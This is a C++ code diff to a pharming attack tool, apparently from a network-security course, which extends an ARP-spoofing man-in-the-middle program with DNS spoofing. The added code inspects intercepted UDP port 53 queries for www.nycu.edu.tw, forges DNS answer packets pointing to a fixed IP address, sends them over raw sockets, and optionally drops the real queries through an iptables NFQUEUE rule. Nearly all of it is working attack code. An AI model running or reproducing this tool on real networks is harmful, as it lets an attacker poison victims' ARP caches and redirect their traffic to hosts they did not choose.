@@ -1,12 +1,29 @@
 #include "pharm_attack.hpp"
 
 // #define INFO 1
+// #define NFQ 1
+#define MAC_LENGTH 6
 
+#ifdef NFQ
 void handler(int signum) {
     system("sudo iptables -t mangle -D OUTPUT -j NFQUEUE --queue-num 0");
     exit(signum);
 }
+#endif
 
+uint16_t computeChecksum(const std::vector<unsigned char> &buffer) {
+    uint32_t sum = 0;
+    for (size_t i = 0; i < buffer.size() - 1; i += 2) {
+        sum += (buffer[i] << 8) + buffer[i + 1];
+    }
+    if (buffer.size() & 1) {
+        sum += buffer[buffer.size() - 1] << 8;
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    return ~sum;
+}
 
 /*
 Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
@@ -44,7 +61,6 @@ bool modifyPacket(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<u
     return modified;
 }
 
-
 void sendMarkedPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
     // Get the payload
     uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
@@ -60,6 +76,115 @@ void sendMarkedPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local
         }
         total_sent += to_send;
     }
+}
+
+void send_dns_response(int payload_size, char *response_packet, uint32_t dst_ip, uint16_t dst_port, struct LocalInfo localinfo) {
+    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (fd == -1) {
+        perror("send_dns_response socket error");
+        return;
+    }
+
+    struct sockaddr_ll socket_address;
+    socket_address.sll_family = AF_PACKET;
+    socket_address.sll_protocol = htons(ETH_P_ALL);
+    socket_address.sll_ifindex = localinfo.device.sll_ifindex;
+    socket_address.sll_hatype = htons(ARPHRD_ETHER);
+    socket_address.sll_pkttype = PACKET_OTHERHOST;
+    socket_address.sll_halen = MAC_LENGTH;
+    socket_address.sll_addr[6] = 0x00;
+    socket_address.sll_addr[7] = 0x00;
+
+    ssize_t ret = sendto(fd, response_packet, payload_size, 0, (struct sockaddr *)&socket_address, sizeof(socket_address));
+    if (ret == -1) {
+        perror("send_dns_response sendto error");
+        close(fd);
+        return;
+    }
+
+    close(fd);
+}
+
+void makeSpoofedDNSResponse(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
+    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);
+    struct udphdr *udph = (struct udphdr *)(buffer + ETH_HDRLEN + sizeof(struct iphdr));
+    struct dnshdr *dnsh = (struct dnshdr *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr));
+    struct dns_query *dnsq = (struct dns_query *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
+    char *domain = (char *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
+
+    char response_packet[2048];
+    memset(response_packet, 0, 2048);
+    int payload_size = 0;
+    std::string spoofed_site = "www.nycu.edu.tw";
+    std::string target_ip = "140.113.24.241";
+
+    // Make the response packet
+    // DNS response header
+    char *dns_response_hdr = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr));
+    memcpy(dns_response_hdr, dnsh->id, 2);
+    memcpy(dns_response_hdr + 2, "\x81\x80", 2);   // Response, Recursion Desired, Recursion Available
+    memcpy(dns_response_hdr + 4, "\x00\x01", 2);   // Question count
+    memcpy(dns_response_hdr + 6, "\x00\x01", 2);   // Answer RR count
+    memcpy(dns_response_hdr + 8, "\x00\x00", 2);   // Authority RR count
+    memcpy(dns_response_hdr + 10, "\x00\x00", 2);  // Additional RR count
+    payload_size += sizeof(dnshdr);
+
+    // DNS response query
+    char *dns_response_query = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
+    memcpy(dns_response_query, dnsq, spoofed_site.size() + 2);                // the original query
+    memcpy(dns_response_query + spoofed_site.size() + 2, "\x00\x01", 2);      // type A
+    memcpy(dns_response_query + spoofed_site.size() + 2 + 2, "\x00\x01", 2);  // class IN
+    payload_size += spoofed_site.size() + 2 + 4;
+
+    // DNS response answer
+    char *dns_response_answer = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr) + payload_size);
+    memcpy(dns_response_answer, "\xc0\x0c", 2);              // pointer to the domain name
+    memcpy(dns_response_answer + 2, "\x00\x01", 2);          // type A
+    memcpy(dns_response_answer + 4, "\x00\x01", 2);          // class IN
+    memcpy(dns_response_answer + 6, "\x00\x00\x00\x3c", 4);  // TTL
+    memcpy(dns_response_answer + 10, "\x00\x04", 2);         // data length
+    for (int i = 0; i < 4; i++) {
+        std::string ip = target_ip.substr(0, target_ip.find("."));
+        target_ip = target_ip.substr(target_ip.find(".") + 1);
+        dns_response_answer[12 + i] = stoi(ip);
+    }
+
+    payload_size += 16;
+
+    // ip, udp header
+    struct iphdr *ip_response = (struct iphdr *)(response_packet + ETH_HLEN);
+    ip_response->ihl = 5;
+    ip_response->version = 4;
+    ip_response->tos = 0;
+    ip_response->tot_len = htons(20 + 8 + payload_size);
+    ip_response->id = htons(0);
+    ip_response->frag_off = 0;
+    ip_response->ttl = 64;
+    ip_response->protocol = IPPROTO_UDP;
+    ip_response->check = 0;
+    ip_response->saddr = iph->daddr;
+    ip_response->daddr = iph->saddr;
+    ip_response->check = htons(computeChecksum(std::vector<unsigned char>(response_packet + ETH_HLEN, response_packet + ETH_HLEN + ip_response->ihl * 4)));
+    payload_size += 20;
+
+    struct udphdr *udp_response = (struct udphdr *)(response_packet + ETH_HLEN + iph->ihl * 4);
+    udp_response->source = htons(53);
+    udp_response->dest = udph->source;
+    udp_response->len = htons(8 + payload_size - 20);
+    udp_response->check = 0;
+    payload_size += 8;
+
+    // ethernet header
+    struct ether_header *eth_response = (struct ether_header *)response_packet;
+    // destination mac: victim's mac
+    memcpy(eth_response->ether_dhost, buffer + ETH_ALEN, ETH_ALEN);
+    // source mac: my mac
+    memcpy(eth_response->ether_shost, local_info.src_mac.data(), ETH_ALEN);
+    eth_response->ether_type = htons(ETH_P_IP);
+    payload_size += ETH_HLEN;
+
+    // Send the packet
+    send_dns_response(payload_size, response_packet, iph->saddr, ntohs(udph->source), local_info);
 }
 
 // Function to handle receiving responses
@@ -92,7 +217,41 @@ void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t,
 
         modifyPacket(buffer, ip_mac_pairs, local_info);
 
-        sendMarkedPacket(buffer, bytes, sd, local_info);
+        // Skip non-UDP packets
+        if (iph->protocol != IPPROTO_UDP) {
+            sendMarkedPacket(buffer, bytes, sd, local_info);
+            continue;
+        }
+
+        struct udphdr *udph = (struct udphdr *)(buffer + ETH_HDRLEN + iph->ihl * 4);
+
+        // Check if the destination port is 53 (DNS Packet)
+        if (ntohs(udph->dest) != 53) {
+            sendMarkedPacket(buffer, bytes, sd, local_info);
+            continue;
+        }
+        char response_packet[2048];
+        memset(response_packet, 0, 2048);
+        int payload_size = 0;
+        std::string spoofed_site = "wwwnycuedutw";
+        std::string target_ip = "140.113.24.241";
+        struct dnshdr *dnsh = (struct dnshdr *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr));
+        struct dns_query *dnsq = (struct dns_query *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
+        char *domain = (char *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
+        printf("Domain: %s\n", domain);
+        // Check if the domain is the spoofed site
+        if (strcmp(domain, spoofed_site.c_str()) != 0) {
+            sendMarkedPacket(buffer, bytes, sd, local_info);
+            continue;
+        }
+        if (!(domain[spoofed_site.size() + 2] == 0x00 && domain[spoofed_site.size() + 3] == 0x01 && domain[spoofed_site.size() + 4] == 0x00 && domain[spoofed_site.size() + 5] == 0x01)) {
+            sendMarkedPacket(buffer, bytes, sd, local_info);
+            continue;
+        }
+
+        printf("Found the spoof target!!!\n");
+        // Make the response packet
+        makeSpoofedDNSResponse(buffer, ip_mac_pairs, local_info);
 
         memset(buffer, 0, IP_MAXPACKET);
     }
@@ -109,22 +268,53 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
     }
     unsigned char *packet;
     int len = nfq_get_payload(nfa, &packet);
-    if (len >= 0) {
-        printf("Received packet with length %d\n", len);
-        // Parse the packet
-        struct iphdr *iph = (struct iphdr *)packet;
-        if (iph->protocol == IPPROTO_UDP) {
-            struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);
-
-            // Check if the destination port is 53 (DNS Packet)
-            if (ntohs(udph->dest) == 53) {
-                printf("DNS Packet\n");
-            }
-        }
-    } else {
+    if (len < 0) {
         printf("Error: nfq_get_payload returned %d\n", len);
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
     }
-    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    // Parse the packet
+    struct iphdr *iph = (struct iphdr *)packet;
+
+    // Skip local
+    if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+
+    // Skip non-UDP packets
+    if (iph->protocol != IPPROTO_UDP) {
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+
+    // Print source and destination IP addresses
+    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
+    printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
+
+    struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);
+
+    // Check if the destination port is 53 (DNS Packet)
+    if (ntohs(udph->dest) != 53) {
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+
+    char response_packet[2048];
+    memset(response_packet, 0, 2048);
+    int payload_size = 0;
+    std::string spoofed_site = "www.nycu.edu.tw";
+    std::string target_ip = "140.113.24.241";
+    struct dnshdr *dnsh = (struct dnshdr *)(packet + iph->ihl * 4 + sizeof(struct udphdr));
+    struct dns_query *dnsq = (struct dns_query *)(packet + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
+    char *domain = (char *)(packet + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
+    printf("Domain: %s\n", domain);
+    // Check if the domain is the spoofed site
+    if (strcmp(domain, spoofed_site.c_str()) != 0) {
+        printf("Not the spoofed site\n");
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+    if (!(domain[spoofed_site.size() + 2] == 0x00 && domain[spoofed_site.size() + 3] == 0x01 && domain[spoofed_site.size() + 4] == 0x00 && domain[spoofed_site.size() + 5] == 0x01)) {
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+    }
+
+    return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
 }
 
 void NFQHandler() {
@@ -226,11 +416,13 @@ int main(int argc, char **argv) {
     std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
     std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
 
+#ifdef NFQ
     system("sudo iptables -t mangle -A OUTPUT -j NFQUEUE --queue-num 0");
     signal(SIGINT, handler);
 
     // Start the NFQHandler
     NFQHandler();
+#endif
 
     // Wait for threads to finish
     send_thread.join();
